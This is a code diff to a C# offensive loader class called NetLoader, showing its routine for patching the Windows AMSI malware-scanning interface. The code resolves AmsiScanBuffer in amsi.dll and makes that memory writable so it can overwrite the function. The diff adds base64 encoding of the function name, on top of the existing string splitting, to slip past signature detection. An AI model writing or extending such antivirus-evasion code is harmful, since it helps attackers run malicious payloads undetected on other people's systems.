@@ -13,6 +13,7 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Net;
+using System.Text;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
 
@@ -160,7 +161,7 @@ public class NetLoader
         {
             Console.WriteLine("[+] Patching AM" + "SI ...");
             IntPtr lib = WinLibBase.LoadLibrary("am" + "si.dll");
-            IntPtr addr = WinLibBase.GetProcAddress(lib, "Am" + "siSca" + "nBuffer");
+            IntPtr addr = WinLibBase.GetProcAddress(lib,  Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI=")));
             uint oldProtect = 0; 
             WinLibBase.VirtualProtect(addr, (UIntPtr)magicJuice.Length, 0x40, out oldProtect);
 
